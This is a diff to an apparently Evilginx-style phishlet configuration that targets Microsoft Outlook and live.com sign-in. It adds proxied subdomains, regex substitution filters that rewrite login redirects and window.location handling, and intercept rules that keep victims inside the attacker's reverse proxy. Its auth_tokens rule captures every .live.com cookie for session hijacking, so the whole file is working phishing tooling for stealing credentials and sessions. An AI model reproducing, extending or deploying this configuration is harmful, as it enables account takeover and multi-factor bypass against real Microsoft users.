@@ -2,15 +2,16 @@ author: '@isloj16'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'privacynotice.account', orig_sub: 'privacynotice.account', domain: 'microsoft.com', session: false, is_landing: false}
+  - {phish_sub: 'privacynotice.account', orig_sub: 'privacynotice.account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'browser.events.data', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ucis.msdxcdn', orig_sub: 'ucis.msdxcdn', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
 sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/login.srf?id=', replace: 'https://{hostname}/login.srf?id=', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'notice?ru=https://{hostname}', replace: 'notice?ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -20,6 +21,17 @@ sub_filters:
   - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'ru=https://{hostname}', replace: 'ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'https://{hostname}', replace: 'https://{orig_hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
+  - {triggers_on: 'ucis.msdxcdn.microsoft.com', orig_sub: 'ucis.msdxcdn', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'https:\/\/login\.live\.com\/login\.srf\?id=[a-zA-Z0-9]*&opid=[a-zA-Z0-9]*&opidt=[a-zA-Z0-9]*', replace: 'https://outlook.{domain}/owa/?nlp=1', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+#  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'window\.location\.replace\(encodeURI\(''https:\/\/login\.\{domain\}', replace: 'window.location.replace(''https://login.{domain}', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.replace\(encodeURI', replace: 'window.location.replace', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+#  - {triggers_on: 'ucis.msdxcdn.microsoft.com', orig_sub: 'ucis.msdxcdn', domain: 'microsoft.com', search: 'window\.location\.replace\(encodeURI', replace: 'window.location.replace', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+#  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.replace\(encodeURI', replace: 'window.location.replace', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+#  - {triggers_on: 'ucis.msdxcdn.microsoft.com', orig_sub: 'ucis.msdxcdn', domain: 'microsoft.com', search: 'encodeURIComponent\(msfpc\)', replace: 'decodeURIComponent(msfpc)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+#  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'encodeURIComponent\(msfpc\)', replace: 'decodeURIComponent(msfpc)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'ucis.msdxcdn.microsoft.com', orig_sub: 'ucis.msdxcdn', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
 auth_tokens:
   - domain: '.live.com'
     keys: ['.*,regexp']
@@ -39,3 +51,8 @@ credentials:
 login:
   domain: 'outlook.live.com'
   path: '/owa/?nlp=1'
+
+intercept:
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/login\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/login.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/login\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/login.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
